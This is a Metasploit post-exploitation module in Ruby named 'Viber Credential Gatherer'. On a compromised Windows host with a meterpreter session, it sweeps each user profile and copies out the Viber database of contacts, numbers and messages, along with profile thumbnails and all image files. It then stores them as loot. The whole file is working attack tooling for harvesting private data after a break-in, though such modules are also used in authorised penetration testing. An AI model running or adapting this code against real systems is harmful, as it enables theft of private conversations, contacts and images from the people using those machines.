##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat

  ARTIFACTS =
    {
      application: 'viber',
      app_category: 'chats',
      gatherable_artifacts: [
        {
          filetypes: 'database',
          path: 'AppData',
          dir: 'ViberPC',
          artifact_file_name: 'viber.db',
          description: "All Contact's names, numbers, sms are saved from user's mobile",
          credential_type: 'database'
        },
        {
          filetypes: 'thumbs',
          path: 'AppData',
          dir: 'ViberPC',
          artifact_file_name: 'Thumbs.db',
          description: "Viber's Contact's profile images in Thumbs.db file",
          credential_type: 'image'
        },
        {
          filetypes: 'images',
          path: 'AppData',
          dir: 'ViberPC',
          artifact_file_name: '*.jpg',
          description: 'Collects all images of contacts and sent received',
          credential_type: 'image'
        }
      ]
    }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Viber Credential Gatherer',
        'Description' => %q{
          This module searches for credentials in Viber desktop application on a Windows host. Viber is a cross-platform voice over IP and instant messaging software application.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kazuyoshi Maruta',
          'Daniel Hallsworth',
          'Barwar Salim M',
          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status 'PackRat credential sweep completed'
  end
end
